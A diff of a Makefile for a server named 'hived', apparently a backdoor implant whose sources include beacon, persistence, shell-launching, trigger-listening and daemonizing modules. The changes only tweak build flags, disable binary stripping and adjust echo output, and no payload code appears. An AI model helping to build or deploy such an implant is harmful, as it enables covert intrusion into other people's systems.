@@ -6,8 +6,8 @@ SERVER_BASENAME = hived
 
 #Default FLAGS
 
-CFLAGS = -Wall -Wextra -ansi -std=gnu99
-CFLAGS += -D_X86 -D_FILE_OFFSET_BITS=64 -lpthread -lutil
+CFLAGS := -Wall -Wextra -ansi -std=gnu99
+CFLAGS += -D_X86 -lpthread -lutil
 CFLAGS += -I. -I../common -I../common/crypto -I../common/ssl/include
 CFLAGS += -D_USE_BASH
 CFLAGS += -DLINUX
@@ -48,10 +48,10 @@ LIBSSL = $(SSL)/libpolarssl.a
 LIBBZIP2 = $(BZIP2)/libbz2.a
 LIBCRYPTO = $(CRYPTO)/libcrypto.a
 
+.PHONY: $(BZIP2)/ARCH_BUILD $(CRYPTO)/ARCH_BUILD $(SSL)/ARCH_BUILD
 include $(BZIP2)/ARCH_BUILD
 include $(CRYPTO)/ARCH_BUILD
 include $(SSL)/ARCH_BUILD
-
 SERVER_SRCS =	beacon.c persistence.c launchshell.c \
 		shuffle.c twofish.c farm9crypt.c jshell.c \
 		survey_mac.c survey_uptime.c trigger_listen.c daemonize.c \
@@ -70,7 +70,7 @@ NETSTAT = netstat_an.c netstat_rn.c
 IFC = ifconfig.c
 DBGFLAGS += -DDEBUG -D_DEBUG -g
 
-STRIPFLAGS += --strip-all --remove-section=.comment --remove-section=.note
+#STRIPFLAGS += --strip-all --remove-section=.comment --remove-section=.note
 
 OS = $(shell uname)
 
@@ -122,7 +122,7 @@ $(info CFLAGS: $(CFLAGS))
 $(info =========================================================================)
 $(info )
 
-.SILENT:
+#.SILENT:
 
 .PHONY: all
 all: $(SERVER) $(SERVER)-dbg
@@ -144,16 +144,16 @@ release: $(SERVER)
 
 $(SERVER): $(LIBSSL) $(LIBBZIP2) init_strings.o $(LIBCRYPTO)
 ifeq ($(OS),Linux)
-	echo "\tLD\t\t$@"
+	echo -e "\tLD\t\t$@"
 	$(CC) $(CFLAGS) $(SERVER_SRCS) $(LDFLAGS) init_strings.o string_utils.o $(LIBS) -o $(BIN)/$(SERVER)
-	echo "\tStripping\t$@"
-	strip $(STRIPFLAGS) $(BIN)/$(SERVER)
+	echo -e "\tStripping\t$@"
+	echo "$(STRIP) $(BIN)/$(SERVER)"
 	md5sum $(BIN)/$(SERVER) > $(BIN)/$(SERVER).md5
 endif
 
 $(SERVER)-dbg: $(LIBSSL) $(LIBBZIP2) $(LIBCRYPTO) init_strings.o
 ifeq ($(OS),Linux)
-	echo "\tLD\t\t$@"
+	echo -e "\tLD\t\t$@"
 	$(CC) $(CFLAGS) $(DBGFLAGS) $(SERVER_SRCS) $(LDFLAGS) init_strings.o string_utils.o $(LIBS) -o $(BIN)/$(SERVER)-dbg
 	md5sum $(BIN)/$(SERVER)-dbg > $(BIN)/$(SERVER)-dbg.md5
 endif
@@ -173,15 +173,15 @@ endif
 strings: init_strings.o
 
 init_strings.o: init_strings.c string_utils.o
-	echo "\tCC\t\t$<"
+	echo -e "\tCC\t\t$<"
 	$(CC) -c $(CFLAGS) init_strings.c
 
 init_strings.c: server_strings.txt string_utils.h
-	echo "\tGenerating\t$@"
+	echo -e "\tGenerating\t$@"
 	python mod_gen_string_header.py server_strings.txt SERVER_STRINGS
 
 string_utils.o: string_utils.h string_utils.c
-	echo "\tCC\t\t$<"
+	echo -e "\tCC\t\t$<"
 	$(CC) -c $(CFLAGS) string_utils.c 
 
 .PHONY: clean
@@ -201,6 +201,5 @@ tarball:
 	make -f ./Makefile tarball
 
 .c.o:
-#	echo -en "\tCC\t$<"
-	echo "   CC        $<"
+	echo -e "   CC        $<"
 	$(CC) $(CFLAGS) -c $<
